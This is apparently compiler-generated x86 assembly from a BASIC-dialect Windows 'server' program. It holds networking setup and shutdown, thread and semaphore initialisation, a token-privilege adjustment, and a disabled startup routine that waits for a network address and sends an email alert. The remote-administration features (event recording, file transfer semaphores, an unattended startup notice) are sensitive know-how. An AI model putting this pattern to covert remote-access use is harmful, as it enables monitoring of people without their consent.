	mov	eax,addr _ListenMail.server@4			;;; i599
	mov	d[ebp-44],eax			;;; i670
#ifdef ConnectToServer.tid
#undef ConnectToServer.tid
#endif
#define ConnectToServer.tid ebp-56	; exposes local variable 'tid'
;
	lea	eax,[ebp-56]			;;; i642
	push	eax			;;; i667a
	push	0			;;; i656a
	push	[ebp-48]			;;; i674a
	push	[ebp-44]			;;; i674a
	push	0			;;; i656a
	push	[ebp-52]			;;; i674a
	call	__beginthreadex			;;; i619
	add	esp,24			;;; i633
	mov	d[%#mailthread.server],eax			;;; i668
;
; [1371] Sleep (10)
	push	10			;;; i656a
	call	_Sleep@4			;;; i619
;
; [1372] RETURN socket
	mov	eax,d[ebp-48]			;;; i665
	jmp	end.func21.server			;;; i258
;
; [1373] ELSE
	jmp	end.if.0076.server			;;; i107
else.0076.server:
;
; [1374] MailReply = MailReply + "\r\nconnection failed\r\n"
	mov	eax,[%MailReply.server]			;;; i663a
	mov	ebx,addr @_string.0319.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr %MailReply.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1375] RETURN 0
	mov	eax,0			;;; i659
	jmp	end.func21.server			;;; i258
;
; [1376] END IF
end.if.0076.server:
;
; [1378] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.ConnectToServer.server:  ;;; Function end label for Assembly Programmers.
end.func21.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  ConnectToServer ()  *****
;  *****
;
; [1380] FUNCTION ShutDown ()
.code
align 16
_ShutDown.server@0:
;  *****
;  *****  FUNCTION  ShutDown ()  *****
;  *****
funcD.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,196			;;; i114a
;
funcBodyD.server:
;
; [1381] SHARED socket,client
data section 'globals$shared'
align	4
%socket.server:	db 4 dup ?
.code
;
; [1382] SHARED APPLSTATUS
;
; [1383] SHARED ShutOnce
data section 'globals$shared'
align	4
%ShutOnce.server:	db 4 dup ?
.code
;
; [1384] SHARED ijllibHandle
data section 'globals$shared'
align	4
%ijllibHandle.server:	db 4 dup ?
.code
;
; [1386] IF ShutOnce THEN RETURN
	mov	eax,d[%ShutOnce.server]			;;; i663a
	test	eax,eax			;;; i220
	jz	>> else.0077.server			;;; i221
	xor	eax,eax			;;; i862
	jmp	end.funcD.server			;;; i258
else.0077.server:
end.if.0077.server:
;
; [1387] ShutOnce = 1
	mov	eax,1			;;; i659
	mov	d[%ShutOnce.server],eax			;;; i668
;
; [1389] '	DestroyTimer ()
;
; [1390] EventStopRecording ()
	call	func53.server			;;; i619
;
; [1391] IF client THEN SendMsg (client,"DISCONNECT")
	mov	eax,d[%client.server]			;;; i663a
	test	eax,eax			;;; i220
	jz	>> else.0078.server			;;; i221
	mov	eax,addr @_string.031F.server			;;; i663
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[%client.server]			;;; i672a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
else.0078.server:
end.if.0078.server:
;
; [1392] NetSleep(100)
	push	100			;;; i656a
	call	func51.server			;;; i619
;
; [1393] APPLSTATUS = $$FALSE
	mov	eax,0			;;; i659
	mov	d[%APPLSTATUS.server],eax			;;; i668
;
; [1394] FSshutdown()
;
; [0] EXTERNAL FUNCTION FSshutdown()
	call	_FSshutdown@0			;;; i619
;
; [1395] ShutDownNet ()
	call	funcE.server			;;; i619
;
; [1397] IF ijllibHandle THEN' free intel jpg lib
	mov	eax,d[%ijllibHandle.server]			;;; i663a
	test	eax,eax			;;; i220
	jz	>> else.0079.server			;;; i221
;
; [1398] FreeLibrary (ijllibHandle)
	push	[%ijllibHandle.server]			;;; i672a
	call	_FreeLibrary@4			;;; i619
;
; [1399] ijllibHandle = 0
	mov	eax,0			;;; i659
	mov	d[%ijllibHandle.server],eax			;;; i668
;
; [1400] END IF
else.0079.server:
end.if.0079.server:
;
; [1402] IF #hPopMenu THEN
	mov	eax,d[%#hPopMenu.server]			;;; i663a
	test	eax,eax			;;; i220
	jz	>> else.007A.server			;;; i221
;
; [1403] ModifyMenuA (#hPopMenu, $$ID_Server_Stop, $$MF_BYCOMMAND | $$MF_STRING | $$MF_POPUP, $$ID_Server_Start, &"Start Server")
	mov	eax,0			;;; i657
	or	eax,0			;;; i763
	or	eax,16			;;; i763
; .xstkD.0000 = ebp-44	; internal variable
	mov	d[ebp-44],eax			;;; i670
	mov	eax,addr @_string.0321.server			;;; i642
	push	eax			;;; i667a
	push	40004			;;; i656a
	push	[ebp-44]			;;; i674a
	push	40005			;;; i656a
	push	[%#hPopMenu.server]			;;; i672a
	call	_ModifyMenuA@20			;;; i619
;
; [1404] END IF
else.007A.server:
end.if.007A.server:
;
; [1406] IF #Startup THEN
data section 'globals$shared'
align	4
%#Startup.server:	db 4 dup ?
.code
	mov	eax,d[%#Startup.server]			;;; i663a
	test	eax,eax			;;; i220
	jz	>> else.007B.server			;;; i221
;
; [1407] CloseHandle (#Startup)
	push	[%#Startup.server]			;;; i672a
	call	_CloseHandle@4			;;; i619
;
; [1408] #Startup = 0
	mov	eax,0			;;; i659
	mov	d[%#Startup.server],eax			;;; i668
;
; [1409] END IF
else.007B.server:
end.if.007B.server:
;
; [1411] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.ShutDown.server:  ;;; Function end label for Assembly Programmers.
end.funcD.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
;-peep
;  *****
;  *****  END FUNCTION  ShutDown ()  *****
;  *****
;
; [1413] FUNCTION ShutDownNet ()
.code
align 16
_ShutDownNet.server@0:
;  *****
;  *****  FUNCTION  ShutDownNet ()  *****
;  *****
funcE.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
	sub	esp,220			;;; i114a
;
funcBodyE.server:
;
; [1414] SHARED socket,client
;
; [1415] SHARED CONNECTED
;
; [1418] CONNECTED = $$FALSE
	mov	eax,0			;;; i659
	mov	d[%CONNECTED.server],eax			;;; i668
;
; [1419] IF socket THEN
	mov	eax,d[%socket.server]			;;; i663a
	test	eax,eax			;;; i220
	jz	>> else.007C.server			;;; i221
;
; [1420] p2pCloseSocket (socket)
	push	[%socket.server]			;;; i672a
	call	func7B.server			;;; i619
;
; [1421] socket = 0
	mov	eax,0			;;; i659
	mov	d[%socket.server],eax			;;; i668
;
; [1422] END IF
else.007C.server:
end.if.007C.server:
;
; [1424] IF client THEN
	mov	eax,d[%client.server]			;;; i663a
	test	eax,eax			;;; i220
	jz	>> else.007D.server			;;; i221
;
; [1425] p2pCloseSocket (client)
	push	[%client.server]			;;; i672a
	call	func7B.server			;;; i619
;
; [1426] client = 0
	mov	eax,0			;;; i659
	mov	d[%client.server],eax			;;; i668
;
; [1427] END IF
else.007D.server:
end.if.007D.server:
;
; [1428] WSACleanup ()
;
; [0] EXTERNAL SFUNCTION  WSACleanup       ()
	call	_WSACleanup@0			;;; i619
;
; [1430] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.funcE.server			;;; i258
;
; [1431] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.ShutDownNet.server:  ;;; Function end label for Assembly Programmers.
end.funcE.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
;-peep
;  *****
;  *****  END FUNCTION  ShutDownNet ()  *****
;  *****
;
; [1433] FUNCTION Initialize ()
.code
align 16
_Initialize.server@0:
;  *****
;  *****  FUNCTION  Initialize ()  *****
;  *****
func4.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.183:
	push	eax, eax, eax, eax
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.183			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,148			;;; i114a
;
;	#### Begin Composite Initialization Code ####
	mov	ecx,13				;;; ..
	xor	eax,eax			;;; ...
A.184:
	push	eax, eax, eax, eax
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.184			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Composite Initialization Code ####
;
	lea	eax,[esp]			;;; i125
	lea	ebx,[esp+400]			;;; i125a
	lea	ecx,[esp+416]			;;; i125b
	mov	d[ebp-44],eax			;;; i670
	mov	d[ebp-48],ebx			;;; i670
	mov	d[ebp-52],ecx			;;; i670
funcBody4.server:
;
; [1434] SHARED XLONG startTick
data section 'globals$shared'
align	4
%startTick.server:	db 4 dup ?
.code
;
; [1435] SHARED APPLSTATUS
;
; [1436] SHARED NETWORK
;
; [1437] WSADATA wsadata
; .composites = ebp-40	; internal variable
#ifdef Initialize.wsadata
#undef Initialize.wsadata
#endif
#define Initialize.wsadata ebp-44	; exposes local variable 'wsadata'
;
;
; [1438] SHARED RECORDEVENTS
;
; [1439] SHARED ShutOnce
;
; [1440] SHARED of
;
; [1441] TOKEN_PRIVILEGES tkp,t
#ifdef Initialize.tkp
#undef Initialize.tkp
#endif
#define Initialize.tkp ebp-48	; exposes local variable 'tkp'
;
#ifdef Initialize.t
#undef Initialize.t
#endif
#define Initialize.t ebp-52	; exposes local variable 't'
;
;
; [1444] SetPriorityClass (GetCurrentProcess(),$$IDLE_PRIORITY_CLASS)
;
; [0] EXTERNAL FUNCTION SetPriorityClass (hProcess, dwPriorityClass)
;
; [0] EXTERNAL FUNCTION GetCurrentProcess ()
	call	_GetCurrentProcess@0			;;; i619
; .xstk4.0000 = ebp-60	; internal variable
	mov	d[ebp-60],eax			;;; i670
	push	64			;;; i656a
	push	[ebp-60]			;;; i674a
	call	_SetPriorityClass@8			;;; i619
;
; [1446] APPLSTATUS = $$TRUE
	mov	eax,-1			;;; i659
	mov	d[%APPLSTATUS.server],eax			;;; i668
;
; [1447] NETWORK = $$FALSE
	mov	eax,0			;;; i659
	mov	d[%NETWORK.server],eax			;;; i668
;
; [1448] '	RECORDEVENTS = $$FALSE
;
; [1450] WSAStartup (2 | (2 << 8), &wsadata)
;
; [0] EXTERNAL SFUNCTION  WSAStartup       (version, addrWSADATA)
	mov	eax,2			;;; i659
	shl	eax,8			;;; i835
	mov	ebx,2			;;; i659
	or	eax,ebx			;;; i763
	mov	d[ebp-60],eax			;;; i670
	mov	eax,d[ebp-44]			;;; i642
	push	eax			;;; i667a
	push	[ebp-60]			;;; i674a
	call	_WSAStartup@8			;;; i619
;
; [1452] ShutOnce = 0
	mov	eax,0			;;; i659
	mov	d[%ShutOnce.server],eax			;;; i668
;
; [1453] startTick = GetTickCount ()
	call	_GetTickCount@0			;;; i619
	mov	d[%startTick.server],eax			;;; i668
;
; [1455] #mailthread = 0
	mov	eax,0			;;; i659
	mov	d[%#mailthread.server],eax			;;; i668
;
; [1456] #Port = $$SR_LPort
	mov	eax,404			;;; i659
	mov	d[%#Port.server],eax			;;; i668
;
; [1457] #startTime$ = GetTime ()
	call	func16.server			;;; i619
	mov	ebx,addr %#startTime$.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1458] #startDate$ = GetDate()
data section 'globals$shared'
align	4
%#startDate$.server:	db 4 dup ?
.code
	call	func17.server			;;; i619
	mov	ebx,addr %#startDate$.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1459] #IPAddr$ = GetLocalIpA()
	call	func15.server			;;; i619
	mov	ebx,addr %#IPAddr$.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1460] #hSSMsg = CreateSemaphoreA (NULL,1,1,NULL)
data section 'globals$shared'
align	4
%#hSSMsg.server:	db 4 dup ?
.code
;
; [0] EXTERNAL FUNCTION CreateSemaphoreA (lpSemaphoreAttributes, lInitialCount, lMaximumCount, lpName)
#ifdef Initialize.NULL
#undef Initialize.NULL
#endif
#define Initialize.NULL ebp-64	; exposes local variable 'NULL'
;
	push	[ebp-64]			;;; i674a
	push	1			;;; i656a
	push	1			;;; i656a
	push	[ebp-64]			;;; i674a
	call	_CreateSemaphoreA@16			;;; i619
	mov	d[%#hSSMsg.server],eax			;;; i668
;
; [1461] #hSCAPS = CreateSemaphoreA (NULL,1,1,NULL)
data section 'globals$shared'
align	4
%#hSCAPS.server:	db 4 dup ?
.code
	push	[ebp-64]			;;; i674a
	push	1			;;; i656a
	push	1			;;; i656a
	push	[ebp-64]			;;; i674a
	call	_CreateSemaphoreA@16			;;; i619
	mov	d[%#hSCAPS.server],eax			;;; i668
;
; [1462] #hSELF	= CreateSemaphoreA (NULL,1,1,NULL)
data section 'globals$shared'
align	4
%#hSELF.server:	db 4 dup ?
.code
	push	[ebp-64]			;;; i674a
	push	1			;;; i656a
	push	1			;;; i656a
	push	[ebp-64]			;;; i674a
	call	_CreateSemaphoreA@16			;;; i619
	mov	d[%#hSELF.server],eax			;;; i668
;
; [1463] #hsmUpL = CreateSemaphoreA (NULL,1,1,NULL)
data section 'globals$shared'
align	4
%#hsmUpL.server:	db 4 dup ?
.code
	push	[ebp-64]			;;; i674a
	push	1			;;; i656a
	push	1			;;; i656a
	push	[ebp-64]			;;; i674a
	call	_CreateSemaphoreA@16			;;; i619
	mov	d[%#hsmUpL.server],eax			;;; i668
;
; [1464] #hsmTree = CreateSemaphoreA (NULL,1,1,NULL)
data section 'globals$shared'
align	4
%#hsmTree.server:	db 4 dup ?
.code
	push	[ebp-64]			;;; i674a
	push	1			;;; i656a
	push	1			;;; i656a
	push	[ebp-64]			;;; i674a
	call	_CreateSemaphoreA@16			;;; i619
	mov	d[%#hsmTree.server],eax			;;; i668
;
; [1465] #hsmDownL = CreateSemaphoreA (NULL,1,1,NULL)
data section 'globals$shared'
align	4
%#hsmDownL.server:	db 4 dup ?
.code
	push	[ebp-64]			;;; i674a
	push	1			;;; i656a
	push	1			;;; i656a
	push	[ebp-64]			;;; i674a
	call	_CreateSemaphoreA@16			;;; i619
	mov	d[%#hsmDownL.server],eax			;;; i668
;
; [1466] #hsmListen = CreateSemaphoreA (NULL,1,1,NULL)
data section 'globals$shared'
align	4
%#hsmListen.server:	db 4 dup ?
.code
	push	[ebp-64]			;;; i674a
	push	1			;;; i656a
	push	1			;;; i656a
	push	[ebp-64]			;;; i674a
	call	_CreateSemaphoreA@16			;;; i619
	mov	d[%#hsmListen.server],eax			;;; i668
;
; [1467] #hsmQueueMsg = CreateSemaphoreA (NULL,1,1,NULL)
data section 'globals$shared'
align	4
%#hsmQueueMsg.server:	db 4 dup ?
.code
	push	[ebp-64]			;;; i674a
	push	1			;;; i656a
	push	1			;;; i656a
	push	[ebp-64]			;;; i674a
	call	_CreateSemaphoreA@16			;;; i619
	mov	d[%#hsmQueueMsg.server],eax			;;; i668
;
; [1468] #hsmEventLog = CreateSemaphoreA (NULL,1,1,NULL)
	push	[ebp-64]			;;; i674a
	push	1			;;; i656a
	push	1			;;; i656a
	push	[ebp-64]			;;; i674a
	call	_CreateSemaphoreA@16			;;; i619
	mov	d[%#hsmEventLog.server],eax			;;; i668
;
; [1469] #hsmGetDirSize = CreateSemaphoreA (NULL,1,1,NULL)
data section 'globals$shared'
align	4
%#hsmGetDirSize.server:	db 4 dup ?
.code
	push	[ebp-64]			;;; i674a
	push	1			;;; i656a
	push	1			;;; i656a
	push	[ebp-64]			;;; i674a
	call	_CreateSemaphoreA@16			;;; i619
	mov	d[%#hsmGetDirSize.server],eax			;;; i668
;
; [1471] 'IFT RECORDEVENTS THEN
;
; [1472] '	of = OpenEventLog()
;
; [1473] EventStartRecording ()
	call	func52.server			;;; i619
;
; [1474] 'END IF
;
; [1476] '	#Startup = CreateThread (NULL, 0, &Startup(),0, 0, 0): Sleep (20)
;
; [1477] QueueMsg ($$QM_INIT,0,"")
	push	0			;;; i665a
	push	0			;;; i656a
	push	5			;;; i656a
	call	func6.server			;;; i619
;
; [1478] #DTH1 = CreateThread (NULL,0,&DispatchThd1(),0,0,0): Sleep (10)
data section 'globals$shared'
align	4
%#DTH1.server:	db 4 dup ?
.code
;
; [0] EXTERNAL FUNCTION CreateThread (lpThreadAttributes, dwStackSize, Startess, lpParameter, dwCreationFlags, lpThreadId)
	mov	eax,addr _DispatchThd1.server@0			;;; i599
	mov	d[ebp-60],eax			;;; i670
	push	0			;;; i656a
	push	0			;;; i656a
	push	0			;;; i656a
	push	[ebp-60]			;;; i674a
	push	0			;;; i656a
	push	[ebp-64]			;;; i674a
	call	_CreateThread@24			;;; i619
	mov	d[%#DTH1.server],eax			;;; i668
	push	10			;;; i656a
	call	_Sleep@4			;;; i619
;
; [1479] '#DTH2 = CreateThread (NULL,0,&DispatchThd2(),0,0,0): Sleep (10)
;
; [1480] '#DTH3 = CreateThread (NULL,0,&DispatchThd3(),0,0,0): Sleep (10)
;
; [1481] '#DTH4 = CreateThread (NULL,0,&DispatchThd4(),0,0,0): Sleep (10)
;
; [1483] buf = 0
#ifdef Initialize.buf
#undef Initialize.buf
#endif
#define Initialize.buf ebp-68	; exposes local variable 'buf'
;
	mov	eax,0			;;; i659
	mov	d[ebp-68],eax			;;; i670
;
; [1484] hToken = 0
#ifdef Initialize.hToken
#undef Initialize.hToken
#endif
#define Initialize.hToken ebp-72	; exposes local variable 'hToken'
;
	mov	eax,0			;;; i659
	mov	d[ebp-72],eax			;;; i670
;
; [1485] tpResult = OpenProcessToken(GetCurrentProcess(),$$TOKEN_ADJUST_PRIVILEGES | $$TOKEN_QUERY,&hToken)
#ifdef Initialize.tpResult
#undef Initialize.tpResult
#endif
#define Initialize.tpResult ebp-76	; exposes local variable 'tpResult'
;
;
; [0] EXTERNAL FUNCTION OpenProcessToken (ProcessHandle, DesiredAccess, TokenHandle)
	call	_GetCurrentProcess@0			;;; i619
	mov	d[ebp-60],eax			;;; i670
	mov	eax,32			;;; i659
	or	eax,8			;;; i763
; .xstk4.0001 = ebp-84	; internal variable
	mov	d[ebp-84],eax			;;; i670
	lea	eax,[ebp-72]			;;; i642
	push	eax			;;; i667a
	push	[ebp-84]			;;; i674a
	push	[ebp-60]			;;; i674a
	call	_OpenProcessToken@12			;;; i619
	mov	d[ebp-76],eax			;;; i670
;
; [1486] LookupPrivilegeValueA(0,&$$Priv_Name,&tkp.Privileges[0].Luid)
;
; [0] EXTERNAL FUNCTION LookupPrivilegeValueA (lpSystemName, lpName, lpLuid)
	mov	eax,addr @_string.18F5.server			;;; i642
	mov	d[ebp-60],eax			;;; i670
	mov	eax,d[ebp-48]			;;; i665
	lea	eax,[eax+4]			;;; i636
	push	eax			;;; i667a
	push	[ebp-60]			;;; i674a
	push	0			;;; i656a
	call	_LookupPrivilegeValueA@12			;;; i619
;
; [1487] tkp.PrivilegeCount = 1'  // one privilege to set
	mov	eax,d[ebp-48]			;;; i665
	mov	ebx,1			;;; i659
	mov	d[eax],ebx			;;; i13b
;
; [1488] tkp.Privileges[0].Attributes = $$SE_PRIVILEGE_ENABLED
	mov	eax,d[ebp-48]			;;; i665
	mov	ebx,2			;;; i659
	mov	d[eax+12],ebx			;;; i13b
;
; [1489] AdjustTokenPrivileges(hToken, 0, &tkp,SIZE(t),&t,&buf)
;
; [0] EXTERNAL FUNCTION AdjustTokenPrivileges (TokenHandle, DisableAllPrivileges, NewState, BufferLength, PreviousState, ReturnLength)
	mov	eax,d[ebp-48]			;;; i642
	mov	d[ebp-60],eax			;;; i670
	mov	eax,16			;;; i584
	mov	d[ebp-84],eax			;;; i670
	mov	eax,d[ebp-52]			;;; i642
; .xstk4.0002 = ebp-92	; internal variable
	mov	d[ebp-92],eax			;;; i670
	lea	eax,[ebp-68]			;;; i642
	push	eax			;;; i667a
	push	[ebp-92]			;;; i674a
	push	[ebp-84]			;;; i674a
	push	[ebp-60]			;;; i674a
	push	0			;;; i656a
	push	[ebp-72]			;;; i674a
	call	_AdjustTokenPrivileges@24			;;; i619
;
; [1491] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func4.server			;;; i258
;
; [1492] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.Initialize.server:  ;;; Function end label for Assembly Programmers.
end.func4.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
;-peep
;  *****
;  *****  END FUNCTION  Initialize ()  *****
;  *****
;
; [1494] FUNCTION Startup()' disabled
.code
align 16
_Startup.server@0:
;  *****
;  *****  FUNCTION  Startup ()  *****
;  *****
func46.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func46.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,188			;;; i114a
;
funcBody46.server:
;
; [1495] STRING ip
#ifdef Startup.ip
#undef Startup.ip
#endif
#define Startup.ip ebp-40	; exposes local variable 'ip'
;
;
; [1498] DO
align 8
do.007E.server:
;
; [1499] ip = GetLocalIpA()
	call	func15.server			;;; i619
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1500] IF (LEFT$(ip,3) == "127") THEN Sleep (1000)
	sub	esp,64			;;; i487
	mov	eax,[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	d[esp+4],3
	call	%_left.d.v			;;; i578
	add	esp,64			;;; i600
	mov	ebx,addr @_string.01C3.server			;;; i663
	call	%_string.compare.sv			;;; i690
	jne	>> else.007F.server			;;; i219
	push	1000			;;; i656a
	call	_Sleep@4			;;; i619
else.007F.server:
end.if.007F.server:
;
; [1501] LOOP WHILE (LEFT$(ip,3) == "127")
do.loop.007E.server:
	sub	esp,64			;;; i487
	mov	eax,[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	d[esp+4],3
	call	%_left.d.v			;;; i578
	add	esp,64			;;; i600
	mov	ebx,addr @_string.01C3.server			;;; i663
	call	%_string.compare.sv			;;; i690
	je	< do.007E.server			;;; i193
end.do.007E.server:
;
; [1503] #IPAddr$ = ip
	mov	eax,[ebp-40]			;;; i665
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %#IPAddr$.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1504] Sleep(2500)
	push	2500			;;; i656a
	call	_Sleep@4			;;; i619
;
; [1506] IF LEFT$(#IPAddr$,3) != "10." THEN
	sub	esp,64			;;; i487
	mov	eax,[%#IPAddr$.server]			;;; i663a
	mov	d[esp],eax			;;; i887
	mov	d[esp+4],3
	call	%_left.d.v			;;; i578
	add	esp,64			;;; i600
	mov	ebx,addr @_string.0351.server			;;; i663
	call	%_string.compare.sv			;;; i690
	je	>> else.0080.server			;;; i219
;
; [1507] message$ = "starting up\0"
#ifdef Startup.message$
#undef Startup.message$
#endif
#define Startup.message$ ebp-44	; exposes local variable 'message$'
;
	mov	eax,addr @_string.0353.server			;;; i663
	call	%_clone.a0			;;; i3a
	lea	ebx,[ebp-44]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1508] FOR c = 1 TO 10
#ifdef Startup.c
#undef Startup.c
#endif
#define Startup.c ebp-48	; exposes local variable 'c'
;
	mov	eax,1			;;; i659
	mov	d[ebp-48],eax			;;; i670
	mov	eax,10			;;; i659
; .forlimit46.0081 = ebp-52	; internal variable
	mov	d[ebp-52],eax			;;; i670
align 8
for.0081.server:
	mov	eax,d[ebp-48]			;;; i665
	mov	ebx,d[ebp-52]			;;; i665
	cmp	eax,ebx			;;; i153
	jg	>> end.for.0081.server			;;; i154
;
; [1509] IFT EMailAlert(&message$) THEN RETURN
	mov	eax,d[ebp-44]			;;; i642
	push	eax			;;; i667a
	call	func48.server			;;; i619
	test	eax,eax			;;; i220
	jz	>> else.0082.server			;;; i221
	xor	eax,eax			;;; i862
	jmp	end.func46.server			;;; i258
else.0082.server:
end.if.0082.server:
;
; [1510] Sleep (2000)
	push	2000			;;; i656a
	call	_Sleep@4			;;; i619
;
; [1511] NEXT c
do.next.0081.server:
	inc	d[ebp-48]			;;; i229
	jmp	for.0081.server			;;; i231
end.for.0081.server:
;
; [1512] END IF
else.0080.server:
end.if.0080.server:
;
; [1514] RETURN
	xor	eax,eax			;;; i862
	jmp	end.func46.server			;;; i258
;
; [1515] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.Startup.server:  ;;; Function end label for Assembly Programmers.
end.func46.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func46.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
free.func46.server:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-44]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  Startup ()  *****
;  *****
;
; [1517] FUNCTION InitTimer ()
.code
align 16
_InitTimer.server@0:
;  *****
;  *****  FUNCTION  InitTimer ()  *****
;  *****
func4E.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
	sub	esp,220			;;; i114a
;
funcBody4E.server:
;
; [1518] '	SHARED wTimerRes
;
; [1519] '	TIMECAPS tc
;
; [1522] '	IF (timeGetDevCaps(&tc, SIZE(TIMECAPS)) != $$TIMERR_NOERROR) THEN
;
; [1523] '       	RETURN $$TIMERR_NOCANDO
;
; [1524] '    END IF
;
; [1525] '	wTimerRes = MIN(MAX(tc.wPeriodMin, XLONG($$TARGET_RESOLUTION)), tc.wPeriodMax)
;
; [1526] '	timeBeginPeriod(wTimerRes)
;
; [1527] '
;
; [1528] '	#pingtimer = timeSetEvent($$SR_PINGPONG, wTimerRes, &TimerCallback(), 0, $$TIME_PERIODIC)
;
; [1529] '	IF (#pingtimer != 0) THEN
;
; [1530] '    	RETURN $$TIMERR_NOCANDO
;
; [1531] '    ELSE
;
; [1532] '    	RETURN $$TIMERR_NOERROR
;
; [1533] '    END IF
;
; [1535] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.InitTimer.server:  ;;; Function end label for Assembly Programmers.
end.func4E.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
;-peep
;  *****
